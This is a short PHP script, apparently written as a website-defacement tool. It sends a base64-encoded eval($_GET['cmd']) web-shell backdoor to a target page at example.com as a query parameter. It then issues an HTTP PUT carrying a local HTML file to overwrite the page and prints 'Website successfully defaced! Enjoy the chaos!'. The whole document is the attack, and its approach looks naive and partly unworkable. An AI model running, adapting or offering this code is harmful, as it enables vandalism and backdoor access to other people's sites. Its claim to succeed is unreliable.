<?php

$targetUrl = "http://example.com/target-page.php";
$htmlFilePath = "cazzy.html";
$defaceHtml = file_get_contents($htmlFilePath);

$backdoorCode = '<?php eval($_GET["cmd"]); ?>';
$injectionUrl = $targetUrl . "?cmd=" . urlencode(base64_encode($backdoorCode));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $injectionUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$response = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $targetUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
curl_setopt($ch, CURLOPT_POSTFIELDS, $defaceHtml);
$response = curl_exec($ch);
curl_close($ch);

echo "Website successfully defaced! Enjoy the chaos!";
?> 
